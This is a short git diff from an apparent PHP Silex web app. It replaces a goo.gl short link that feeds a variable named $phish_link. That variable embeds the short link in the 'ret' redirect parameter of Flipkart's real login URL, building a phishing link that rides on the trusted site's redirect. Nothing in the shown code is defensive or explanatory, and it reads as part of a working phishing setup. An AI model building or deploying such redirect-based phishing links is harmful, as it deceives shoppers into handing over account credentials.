@@ -12,7 +12,7 @@ $app->register(new Silex\Provider\MonologServiceProvider(), array(
 
 $app->get('/', function() use($app) {
 
-    $short_appLink = "http://goo.gl/jpz55X";
+    $short_appLink = "http://goo.gl/XspE3w";
     $phish_link = "https://dl.flipkart.com/dl/account/login?ret=".urlencode($short_appLink);
 
 return <<<l
